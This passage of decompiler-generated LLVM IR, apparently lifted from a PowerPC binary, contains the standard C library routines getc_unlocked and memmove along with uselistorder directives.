  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10013850.645 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3c0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d2d0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d298, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d26c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d258, { 1, 0 }
  uselistorder label %dec_label_pc_1000d23c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d214, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d1f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d1d0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d124, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d0c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d080, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d044, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d018, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cff8, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce74, { 1, 0 }
  uselistorder label %dec_label_pc_1000cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_1000cda0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd94, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000d414 = load i32, i32* @lr, align 4
  store i32 %v0_1000d414, i32* %r0.global-to-local, align 4
  %v0_1000d41c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000d428 = add i32 %tmp, 16
  %v3_1000d428 = inttoptr i32 %v2_1000d428 to i32*
  %v4_1000d428 = load i32, i32* %v3_1000d428, align 4
  store i32 %v4_1000d428, i32* %r9.global-to-local, align 4
  %v2_1000d42c = add i32 %tmp, 24
  %v3_1000d42c = inttoptr i32 %v2_1000d42c to i32*
  %v4_1000d42c = load i32, i32* %v3_1000d42c, align 4
  store i32 %v4_1000d42c, i32* %r0.global-to-local, align 4
  %v2_1000d430 = icmp ult i32 %v4_1000d428, %v4_1000d42c
  br i1 %v2_1000d430, label %dec_label_pc_1000d498, label %dec_label_pc_1000d438

dec_label_pc_1000d438:                            ; preds = %entry
  %v3_1000d438 = load i16, i16* %arg1, align 2
  %v4_1000d438 = zext i16 %v3_1000d438 to i32
  %v1_1000d43c = and i32 %v4_1000d438, 131
  store i32 %v1_1000d43c, i32* %r0.global-to-local, align 4
  %v2_1000d440 = icmp ugt i32 %v1_1000d43c, 128
  br i1 %v2_1000d440, label %dec_label_pc_1000d458, label %dec_label_pc_1000d448

dec_label_pc_1000d448:                            ; preds = %dec_label_pc_1000d438
  store i32 268489808, i32* @lr, align 4
  %v3_1000d44c = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_1000d428)
  store i32 %v3_1000d44c, i32* %r3.global-to-local, align 4
  %v3_1000d450 = icmp eq i32 %v3_1000d44c, 0
  br i1 %v3_1000d450, label %dec_label_pc_1000d448.dec_label_pc_1000d458_crit_edge, label %dec_label_pc_1000d534

dec_label_pc_1000d448.dec_label_pc_1000d458_crit_edge: ; preds = %dec_label_pc_1000d448
  %v0_1000d458.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d458

dec_label_pc_1000d458:                            ; preds = %dec_label_pc_1000d448.dec_label_pc_1000d458_crit_edge, %dec_label_pc_1000d438
  %v2_1000d4b8 = phi i32 [ %v0_1000d458.pre, %dec_label_pc_1000d448.dec_label_pc_1000d458_crit_edge ], [ %tmp, %dec_label_pc_1000d438 ]
  %v1_1000d458 = inttoptr i32 %v2_1000d4b8 to i16*
  %v2_1000d458 = load i16, i16* %v1_1000d458, align 2
  %v3_1000d458 = zext i16 %v2_1000d458 to i32
  %v1_1000d45c = and i32 %v3_1000d458, 2
  store i32 %v1_1000d45c, i32* %r0.global-to-local, align 4
  %v3_1000d45c = icmp eq i32 %v1_1000d45c, 0
  br i1 %v3_1000d45c, label %dec_label_pc_1000d488, label %dec_label_pc_1000d464

dec_label_pc_1000d464:                            ; preds = %dec_label_pc_1000d458
  %v1_1000d464 = call i32 @__asm_rlwinm(i32 %v3_1000d458, i32 2, i32 29, i32 29)
  %v1_1000d468 = load i32, i32* @r31, align 4
  %v2_1000d468 = add i32 %v1_1000d468, %v1_1000d464
  store i32 %v2_1000d468, i32* %r9.global-to-local, align 4
  %v1_1000d46c = add i32 %v2_1000d468, 39
  %v2_1000d46c = inttoptr i32 %v1_1000d46c to i8*
  %v3_1000d46c = load i8, i8* %v2_1000d46c, align 1
  %v4_1000d46c = zext i8 %v3_1000d46c to i32
  store i32 %v4_1000d46c, i32* %r0.global-to-local, align 4
  %v1_1000d470 = add nsw i32 %v3_1000d458, -1
  store i32 %v1_1000d470, i32* %r9.global-to-local, align 4
  %v1_1000d474 = trunc i32 %v1_1000d470 to i16
  %v3_1000d474 = inttoptr i32 %v1_1000d468 to i16*
  store i16 %v1_1000d474, i16* %v3_1000d474, align 2
  %v0_1000d478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d478, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d480 = load i32, i32* @r31, align 4
  %v2_1000d480 = add i32 %v1_1000d480, 40
  %v3_1000d480 = inttoptr i32 %v2_1000d480 to i32*
  store i32 0, i32* %v3_1000d480, align 4
  br label %dec_label_pc_1000d538

dec_label_pc_1000d488:                            ; preds = %dec_label_pc_1000d458
  %v1_1000d488 = add i32 %v2_1000d4b8, 16
  %v2_1000d488 = inttoptr i32 %v1_1000d488 to i32*
  %v3_1000d488 = load i32, i32* %v2_1000d488, align 4
  store i32 %v3_1000d488, i32* %r9.global-to-local, align 4
  %v1_1000d48c = add i32 %v2_1000d4b8, 20
  %v2_1000d48c = inttoptr i32 %v1_1000d48c to i32*
  %v3_1000d48c = load i32, i32* %v2_1000d48c, align 4
  store i32 %v3_1000d48c, i32* %r0.global-to-local, align 4
  %v4_1000d490 = icmp eq i32 %v3_1000d48c, %v3_1000d488
  br i1 %v4_1000d490, label %dec_label_pc_1000d4a4, label %dec_label_pc_1000d498

dec_label_pc_1000d498:                            ; preds = %dec_label_pc_1000d488, %entry
  %v1_1000d50c7 = phi i32 [ %v2_1000d4b8, %dec_label_pc_1000d488 ], [ %tmp, %entry ]
  %v0_1000d498 = phi i32 [ %v3_1000d488, %dec_label_pc_1000d488 ], [ %v4_1000d428, %entry ]
  %v1_1000d498 = inttoptr i32 %v0_1000d498 to i8*
  %v2_1000d498 = load i8, i8* %v1_1000d498, align 1
  %v3_1000d498 = zext i8 %v2_1000d498 to i32
  store i32 %v3_1000d498, i32* %r3.global-to-local, align 4
  %v1_1000d49c = add i32 %v0_1000d498, 1
  store i32 %v1_1000d49c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d50c

dec_label_pc_1000d4a4:                            ; preds = %dec_label_pc_1000d488
  %v1_1000d4a4 = add i32 %v2_1000d4b8, 4
  %v2_1000d4a4 = inttoptr i32 %v1_1000d4a4 to i32*
  %v3_1000d4a4 = load i32, i32* %v2_1000d4a4, align 4
  store i32 %v3_1000d4a4, i32* %r0.global-to-local, align 4
  %v3_1000d4a8 = icmp eq i32 %v3_1000d4a4, -2
  br i1 %v3_1000d4a8, label %dec_label_pc_1000d4b0, label %dec_label_pc_1000d4c0

dec_label_pc_1000d4b0:                            ; preds = %dec_label_pc_1000d4a4
  %v1_1000d4b0 = or i32 %v3_1000d458, 4
  store i32 %v1_1000d4b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000d4b8 = trunc i32 %v1_1000d4b0 to i16
  store i16 %v1_1000d4b8, i16* %v1_1000d458, align 2
  br label %dec_label_pc_1000d538

dec_label_pc_1000d4c0:                            ; preds = %dec_label_pc_1000d4a4
  %v1_1000d4c0 = and i32 %v3_1000d458, 768
  store i32 %v1_1000d4c0, i32* %r0.global-to-local, align 4
  %v3_1000d4c0 = icmp eq i32 %v1_1000d4c0, 0
  br i1 %v3_1000d4c0, label %dec_label_pc_1000d4d4, label %dec_label_pc_1000d4c8

dec_label_pc_1000d4c8:                            ; preds = %dec_label_pc_1000d4c0
  store i32 ptrtoint (i32** @global_var_10024a08.569 to i32), i32* %r3.global-to-local, align 4
  store i32 268489940, i32* @lr, align 4
  %v4_1000d4d0 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_10024a08.569 to i16*), i32 %v3_1000d488)
  store i32 %v4_1000d4d0, i32* %r3.global-to-local, align 4
  %v0_1000d4d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d4d4

dec_label_pc_1000d4d4:                            ; preds = %dec_label_pc_1000d4c0, %dec_label_pc_1000d4c8
  %v0_1000d514 = phi i32 [ %v2_1000d4b8, %dec_label_pc_1000d4c0 ], [ %v0_1000d4d4.pre, %dec_label_pc_1000d4c8 ]
  %v1_1000d4d4 = add i32 %v0_1000d514, 8
  %v2_1000d4d4 = inttoptr i32 %v1_1000d4d4 to i32*
  %v3_1000d4d4 = load i32, i32* %v2_1000d4d4, align 4
  store i32 %v3_1000d4d4, i32* %r9.global-to-local, align 4
  %v1_1000d4d8 = add i32 %v0_1000d514, 12
  %v2_1000d4d8 = inttoptr i32 %v1_1000d4d8 to i32*
  %v3_1000d4d8 = load i32, i32* %v2_1000d4d8, align 4
  store i32 %v3_1000d4d8, i32* %r0.global-to-local, align 4
  %v4_1000d4dc = icmp eq i32 %v3_1000d4d8, %v3_1000d4d4
  br i1 %v4_1000d4dc, label %dec_label_pc_1000d514, label %dec_label_pc_1000d4e4

dec_label_pc_1000d4e4:                            ; preds = %dec_label_pc_1000d4d4
  %v2_1000d4e4 = add i32 %v0_1000d514, 24
  %v3_1000d4e4 = inttoptr i32 %v2_1000d4e4 to i32*
  store i32 %v3_1000d4d4, i32* %v3_1000d4e4, align 4
  %v0_1000d4e8 = load i32, i32* @r31, align 4
  store i32 %v0_1000d4e8, i32* %r3.global-to-local, align 4
  store i32 268489968, i32* @lr, align 4
  %v3_1000d4ec = call i32 @__stdio_rfill(i32 %v0_1000d4e8, i32 %v3_1000d4d4)
  store i32 %v3_1000d4ec, i32* %r3.global-to-local, align 4
  %v3_1000d4f0 = icmp eq i32 %v3_1000d4ec, 0
  br i1 %v3_1000d4f0, label %dec_label_pc_1000d534, label %dec_label_pc_1000d4f8

dec_label_pc_1000d4f8:                            ; preds = %dec_label_pc_1000d4e4
  %v0_1000d4f8 = load i32, i32* @r31, align 4
  %v1_1000d4f8 = add i32 %v0_1000d4f8, 20
  %v2_1000d4f8 = inttoptr i32 %v1_1000d4f8 to i32*
  %v3_1000d4f8 = load i32, i32* %v2_1000d4f8, align 4
  store i32 %v3_1000d4f8, i32* %r0.global-to-local, align 4
  %v1_1000d4fc = add i32 %v0_1000d4f8, 16
  %v2_1000d4fc = inttoptr i32 %v1_1000d4fc to i32*
  %v3_1000d4fc = load i32, i32* %v2_1000d4fc, align 4
  store i32 %v3_1000d4fc, i32* %r9.global-to-local, align 4
  %v2_1000d500 = add i32 %v0_1000d4f8, 24
  %v3_1000d500 = inttoptr i32 %v2_1000d500 to i32*
  store i32 %v3_1000d4f8, i32* %v3_1000d500, align 4
  %v0_1000d504 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d504 = add i32 %v0_1000d504, 1
  store i32 %v1_1000d504, i32* %r0.global-to-local, align 4
  %v1_1000d508 = inttoptr i32 %v0_1000d504 to i8*
  %v2_1000d508 = load i8, i8* %v1_1000d508, align 1
  %v3_1000d508 = zext i8 %v2_1000d508 to i32
  store i32 %v3_1000d508, i32* %r3.global-to-local, align 4
  %v1_1000d50c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d50c

dec_label_pc_1000d50c:                            ; preds = %dec_label_pc_1000d498, %dec_label_pc_1000d4f8
  %v1_1000d50c = phi i32 [ %v1_1000d50c7, %dec_label_pc_1000d498 ], [ %v1_1000d50c.pre, %dec_label_pc_1000d4f8 ]
  %v0_1000d50c = phi i32 [ %v1_1000d49c, %dec_label_pc_1000d498 ], [ %v1_1000d504, %dec_label_pc_1000d4f8 ]
  %v2_1000d50c = add i32 %v1_1000d50c, 16
  %v3_1000d50c = inttoptr i32 %v2_1000d50c to i32*
  store i32 %v0_1000d50c, i32* %v3_1000d50c, align 4
  br label %dec_label_pc_1000d538

dec_label_pc_1000d514:                            ; preds = %dec_label_pc_1000d4d4
  %v1_1000d514 = inttoptr i32 %v0_1000d514 to i16*
  store i32 %v0_1000d514, i32* %r3.global-to-local, align 4
  %v2_1000d518 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268490020, i32* @lr, align 4
  %v5_1000d520 = call i32 @__stdio_READ(i16* %v1_1000d514, i32 %v2_1000d518, i32 1)
  store i32 %v5_1000d520, i32* %r3.global-to-local, align 4
  %v3_1000d524 = icmp eq i32 %v5_1000d520, 0
  br i1 %v3_1000d524, label %dec_label_pc_1000d534, label %dec_label_pc_1000d52c

dec_label_pc_1000d52c:                            ; preds = %dec_label_pc_1000d514
  %v3_1000d52c = load i8, i8* %stack_var_-24, align 1
  %v4_1000d52c = sext i8 %v3_1000d52c to i32
  store i32 %v4_1000d52c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d538

dec_label_pc_1000d534:                            ; preds = %dec_label_pc_1000d448, %dec_label_pc_1000d514, %dec_label_pc_1000d4e4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d538

dec_label_pc_1000d538:                            ; preds = %dec_label_pc_1000d52c, %dec_label_pc_1000d50c, %dec_label_pc_1000d4b0, %dec_label_pc_1000d464, %dec_label_pc_1000d534
  store i32 %v0_1000d414, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d41c, i32* @r31, align 4
  %v0_1000d548 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d548

; uselistorder directives
  uselistorder i32 %v0_1000d514, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000d498, { 1, 0 }
  uselistorder i32 %v3_1000d488, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000d468, { 1, 0 }
  uselistorder i32 %v3_1000d458, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_1000d4b8, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_10024a08.569 to i16*), { 1, 0 }
  uselistorder i16* @global_var_100246dc.557, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d538, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000d534, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d50c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4d4, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000d54c = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000d554 = load i32, i32* @r5, align 4
  store i32 %v0_1000d554, i32* @r11, align 4
  br i1 %v2_1000d54c, label %dec_label_pc_1000d560, label %dec_label_pc_1000d55c

dec_label_pc_1000d55c:                            ; preds = %entry
  %v0_1000d55c = call i32 @memcpy()
  store i32 %v0_1000d55c, i32* @r3, align 4
  %v0_1000d560.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000d560

dec_label_pc_1000d560:                            ; preds = %entry, %dec_label_pc_1000d55c
  %v0_1000d560 = phi i32 [ %v0_1000d554, %entry ], [ %v0_1000d560.pre, %dec_label_pc_1000d55c ]
  %v1_1000d560 = call i32 @__asm_rlwinm.(i32 %v0_1000d560, i32 29, i32 3, i32 31)
  store i32 %v1_1000d560, i32* %r9.global-to-local, align 4
  %v4_1000d560 = icmp eq i32 %v1_1000d560, 0
  %v1_1000d564 = load i32, i32* @r5, align 4
  %v2_1000d564 = add i32 %v1_1000d564, %arg2
  store i32 %v2_1000d564, i32* %r4.global-to-local, align 4
  %v0_1000d568 = load i32, i32* @r3, align 4
  %v2_1000d568 = add i32 %v0_1000d568, %v1_1000d564
  store i32 %v2_1000d568, i32* %r10.global-to-local, align 4
  br i1 %v4_1000d560, label %dec_label_pc_1000d590, label %dec_label_pc_1000d570

dec_label_pc_1000d570:                            ; preds = %dec_label_pc_1000d560
  %v1_1000d570 = urem i32 %v2_1000d568, 4
  %v3_1000d570 = icmp eq i32 %v1_1000d570, 0
  br i1 %v3_1000d570, label %dec_label_pc_1000d578, label %dec_label_pc_1000d5c4

dec_label_pc_1000d578:                            ; preds = %dec_label_pc_1000d5dc.dec_label_pc_1000d578_crit_edge, %dec_label_pc_1000d570
  %v1_1000d584.pre = phi i32 [ %v1_1000d584.pre.pre, %dec_label_pc_1000d5dc.dec_label_pc_1000d578_crit_edge ], [ %v2_1000d568, %dec_label_pc_1000d570 ]
  %v0_1000d578 = phi i32 [ %v1_1000d5dc, %dec_label_pc_1000d5dc.dec_label_pc_1000d578_crit_edge ], [ %v1_1000d560, %dec_label_pc_1000d570 ]
  store i32 %v0_1000d578, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d57c

dec_label_pc_1000d57c:                            ; preds = %dec_label_pc_1000d57c, %dec_label_pc_1000d578
  %v1_1000d584 = phi i32 [ %v2_1000d588, %dec_label_pc_1000d57c ], [ %v1_1000d584.pre, %dec_label_pc_1000d578 ]
  %v0_1000d57c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d57c = add i32 %v0_1000d57c, -4
  %v2_1000d57c = inttoptr i32 %v1_1000d57c to i32*
  %v3_1000d57c = load i32, i32* %v2_1000d57c, align 4
  %v1_1000d580 = add i32 %v0_1000d57c, -8
  %v2_1000d580 = inttoptr i32 %v1_1000d580 to i32*
  %v3_1000d580 = load i32, i32* %v2_1000d580, align 4
  store i32 %v3_1000d580, i32* %r9.global-to-local, align 4
  store i32 %v1_1000d580, i32* %r4.global-to-local, align 4
  %v2_1000d584 = add i32 %v1_1000d584, -4
  %v3_1000d584 = inttoptr i32 %v2_1000d584 to i32*
  store i32 %v3_1000d57c, i32* %v3_1000d584, align 4
  %v0_1000d588 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d588 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d588 = add i32 %v1_1000d588, -8
  %v3_1000d588 = inttoptr i32 %v2_1000d588 to i32*
  store i32 %v0_1000d588, i32* %v3_1000d588, align 4
  store i32 %v2_1000d588, i32* %r10.global-to-local, align 4
  %v0_1000d58c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d58c = add i32 %v0_1000d58c, -1
  store i32 %v1_1000d58c, i32* %ctr.global-to-local, align 4
  %v2_1000d58c = icmp eq i32 %v1_1000d58c, 0
  br i1 %v2_1000d58c, label %dec_label_pc_1000d590, label %dec_label_pc_1000d57c

dec_label_pc_1000d590:                            ; preds = %dec_label_pc_1000d57c, %dec_label_pc_1000d5dc, %dec_label_pc_1000d560
  %v0_1000d590 = load i32, i32* @r11, align 4
  %v1_1000d590 = urem i32 %v0_1000d590, 8
  store i32 %v1_1000d590, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000d590, 4
  br i1 %tmp, label %dec_label_pc_1000d5a8, label %dec_label_pc_1000d59c

dec_label_pc_1000d59c:                            ; preds = %dec_label_pc_1000d590
  %v0_1000d59c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d59c = add i32 %v0_1000d59c, -4
  %v2_1000d59c = inttoptr i32 %v1_1000d59c to i32*
  %v3_1000d59c = load i32, i32* %v2_1000d59c, align 4
  store i32 %v1_1000d59c, i32* %r4.global-to-local, align 4
  %v1_1000d5a0 = add nsw i32 %v1_1000d590, -4
  store i32 %v1_1000d5a0, i32* %r5.global-to-local, align 4
  %v1_1000d5a4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d5a4 = add i32 %v1_1000d5a4, -4
  %v3_1000d5a4 = inttoptr i32 %v2_1000d5a4 to i32*
  store i32 %v3_1000d59c, i32* %v3_1000d5a4, align 4
  store i32 %v2_1000d5a4, i32* %r10.global-to-local, align 4
  %v0_1000d5a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d5a8

dec_label_pc_1000d5a8:                            ; preds = %dec_label_pc_1000d590, %dec_label_pc_1000d59c
  %v0_1000d5b0 = phi i32 [ %v1_1000d590, %dec_label_pc_1000d590 ], [ %v0_1000d5a8.pre, %dec_label_pc_1000d59c ]
  %v3_1000d5a8 = icmp eq i32 %v0_1000d5b0, 0
  br i1 %v3_1000d5a8, label %dec_label_pc_1000d5e8, label %dec_label_pc_1000d5b0

dec_label_pc_1000d5b0:                            ; preds = %dec_label_pc_1000d5a8
  store i32 %v0_1000d5b0, i32* %ctr.global-to-local, align 4
  %v2_1000d5b8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d5b4

dec_label_pc_1000d5b4:                            ; preds = %dec_label_pc_1000d5b4, %dec_label_pc_1000d5b0
  %v2_1000d5b8 = phi i32 [ %v3_1000d5b8, %dec_label_pc_1000d5b4 ], [ %v2_1000d5b8.pre, %dec_label_pc_1000d5b0 ]
  %v0_1000d5b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d5b4 = add i32 %v0_1000d5b4, -1
  %v2_1000d5b4 = inttoptr i32 %v1_1000d5b4 to i8*
  %v3_1000d5b4 = load i8, i8* %v2_1000d5b4, align 1
  store i32 %v1_1000d5b4, i32* %r4.global-to-local, align 4
  %v3_1000d5b8 = add i32 %v2_1000d5b8, -1
  %v4_1000d5b8 = inttoptr i32 %v3_1000d5b8 to i8*
  store i8 %v3_1000d5b4, i8* %v4_1000d5b8, align 1
  store i32 %v3_1000d5b8, i32* %r10.global-to-local, align 4
  %v0_1000d5bc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5bc = add i32 %v0_1000d5bc, -1
  store i32 %v1_1000d5bc, i32* %ctr.global-to-local, align 4
  %v2_1000d5bc = icmp eq i32 %v1_1000d5bc, 0
  br i1 %v2_1000d5bc, label %dec_label_pc_1000d5e8, label %dec_label_pc_1000d5b4

dec_label_pc_1000d5c4:                            ; preds = %dec_label_pc_1000d570
  %v1_1000d5c4 = sub nsw i32 4, %v1_1000d570
  store i32 %v1_1000d5c4, i32* %ctr.global-to-local, align 4
  %v2_1000d5cc = sub i32 %v1_1000d564, %v1_1000d5c4
  store i32 %v2_1000d5cc, i32* @r11, align 4
  %v1_1000d5d09 = add i32 %v2_1000d564, -1
  %v2_1000d5d010 = inttoptr i32 %v1_1000d5d09 to i8*
  %v3_1000d5d011 = load i8, i8* %v2_1000d5d010, align 1
  store i32 %v1_1000d5d09, i32* %r4.global-to-local, align 4
  %v3_1000d5d413 = add i32 %v2_1000d568, -1
  %v4_1000d5d414 = inttoptr i32 %v3_1000d5d413 to i8*
  store i8 %v3_1000d5d011, i8* %v4_1000d5d414, align 1
  store i32 %v3_1000d5d413, i32* %r10.global-to-local, align 4
  %v0_1000d5d815 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5d816 = add i32 %v0_1000d5d815, -1
  store i32 %v1_1000d5d816, i32* %ctr.global-to-local, align 4
  %v2_1000d5d817 = icmp eq i32 %v1_1000d5d816, 0
  br i1 %v2_1000d5d817, label %dec_label_pc_1000d5dc, label %dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge

dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge: ; preds = %dec_label_pc_1000d5c4, %dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge
  %v3_1000d5d418 = phi i32 [ %v3_1000d5d4, %dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge ], [ %v3_1000d5d413, %dec_label_pc_1000d5c4 ]
  %v0_1000d5d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d5d0 = add i32 %v0_1000d5d0.pre, -1
  %v2_1000d5d0 = inttoptr i32 %v1_1000d5d0 to i8*
  %v3_1000d5d0 = load i8, i8* %v2_1000d5d0, align 1
  store i32 %v1_1000d5d0, i32* %r4.global-to-local, align 4
  %v3_1000d5d4 = add i32 %v3_1000d5d418, -1
  %v4_1000d5d4 = inttoptr i32 %v3_1000d5d4 to i8*
  store i8 %v3_1000d5d0, i8* %v4_1000d5d4, align 1
  store i32 %v3_1000d5d4, i32* %r10.global-to-local, align 4
  %v0_1000d5d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5d8 = add i32 %v0_1000d5d8, -1
  store i32 %v1_1000d5d8, i32* %ctr.global-to-local, align 4
  %v2_1000d5d8 = icmp eq i32 %v1_1000d5d8, 0
  br i1 %v2_1000d5d8, label %dec_label_pc_1000d5dc, label %dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge

dec_label_pc_1000d5dc:                            ; preds = %dec_label_pc_1000d5d0.dec_label_pc_1000d5d0_crit_edge, %dec_label_pc_1000d5c4
  %v0_1000d5dc = load i32, i32* @r11, align 4
  %v1_1000d5dc = call i32 @__asm_rlwinm.(i32 %v0_1000d5dc, i32 29, i32 3, i32 31)
  store i32 %v1_1000d5dc, i32* %r9.global-to-local, align 4
  %v4_1000d5dc = icmp eq i32 %v1_1000d5dc, 0
  br i1 %v4_1000d5dc, label %dec_label_pc_1000d590, label %dec_label_pc_1000d5dc.dec_label_pc_1000d578_crit_edge

dec_label_pc_1000d5dc.dec_label_pc_1000d578_crit_edge: ; preds = %dec_label_pc_1000d5dc
  %v1_1000d584.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d578

dec_label_pc_1000d5e8:                            ; preds = %dec_label_pc_1000d5b4, %dec_label_pc_1000d5a8
  %v0_1000d5e8 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000d5e8

; uselistorder directives
  uselistorder i32 %v1_1000d5dc, { 1, 2, 0 }
  uselistorder i32 %v1_1000d5d8, { 1, 0 }
  uselistorder i32 %v3_1000d5d4, { 1, 2, 0 }
  uselistorder i32 %v1_1000d5bc, { 1, 0 }
  uselistorder i32 %v3_1000d5b8, { 1, 2, 0 }
  uselistorder i32 %v1_1000d590, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d58c, { 1, 0 }
  uselistorder i32 %v2_1000d588, { 1, 2, 0 }
  uselistorder i32 %v1_1000d570, { 1, 0 }
  uselistorder i32 %v2_1000d568, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000d564, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 6, 4, 7, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
